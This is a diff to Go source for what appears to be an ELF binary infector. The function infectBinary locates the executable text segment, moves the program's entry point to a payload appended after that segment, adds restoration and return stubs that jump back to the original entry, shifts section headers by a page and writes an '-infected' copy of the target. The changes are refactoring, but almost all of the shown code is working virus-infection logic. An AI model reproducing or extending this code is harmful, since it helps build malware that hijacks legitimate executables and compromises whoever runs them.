@@ -177,41 +177,36 @@ func checkError(e error) {
 }
 
 func (t *targetBin) infectBinary(debug bool) error {
-	var textSegStart64 uint64
-	var textSegEnd64 uint64
-
-	var oEntry64 uint64
-	var oShoff64 uint64
+	var textSegEnd interface{}
+	var oShoff interface{}
+	var textNdx int
 
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
-		oEntry64 = t.Hdr.(*elf.Header64).Entry
-		oShoff64 = t.Hdr.(*elf.Header64).Shoff
+		oEntry := t.Hdr.(*elf.Header64).Entry
+		oShoff = t.Hdr.(*elf.Header64).Shoff
 
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
-
-		var textNdx int
-		var retStub []byte
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		pNum := int(t.Hdr.(*elf.Header64).Phnum)
+
 		for i := 0; i < pNum; i++ {
 			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
 				textNdx = i
 				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
-				textSegStart64 = pHeaders[i].Off
 				if debug {
-					fmt.Printf(MOD_ENTRY_POINT, oEntry64, t.Hdr.(*elf.Header64).Entry)
+					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
 				}
 
-				textSegEnd64 = pHeaders[i].Off + pHeaders[i].Filesz
+				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
 				if debug {
-					fmt.Printf(TEXT_SEG_START, textSegStart64)
-					fmt.Printf(TEXT_SEG_END, textSegEnd64)
+					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
+					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
 					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
 
 				t.Payload.Write(restoration64)
-				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry64)
+				retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 				t.Payload.Write(retStub)
 
 				if debug {
@@ -249,7 +244,7 @@ func (t *targetBin) infectBinary(debug bool) error {
 		sNum := int(t.Hdr.(*elf.Header64).Shnum)
 
 		for k := 0; k < sNum; k++ {
-			if sectionHdrTable[k].Off >= textSegEnd64 {
+			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
 				if debug {
 					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				}
@@ -295,9 +290,9 @@ func (t *targetBin) infectBinary(debug bool) error {
 	var ephdrsz int
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
-		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
 	case elf.ELFCLASS32:
-		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
 	}
 
 	infected.Write(t.Contents[ephdrsz:])
@@ -310,12 +305,17 @@ func (t *targetBin) infectBinary(debug bool) error {
 		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
 	}
 
-	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
+	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
 	finalInfection := infected.Bytes()
 
-	copy(finalInfection[int(oShoff64):], infectedShdrTable.Bytes())
-
-	endOfInfection := int(textSegEnd64)
+	var endOfInfection int
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:
+		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
+		endOfInfection = int(textSegEnd.(uint64))
+	case elf.ELFCLASS32:
+		fmt.Println("not implemented yet")
+	}
 
 	copy(finalInfectionTwo, finalInfection[:endOfInfection])
 
@@ -324,7 +324,7 @@ func (t *targetBin) infectBinary(debug bool) error {
 	}
 
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
-	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
+	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
 	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
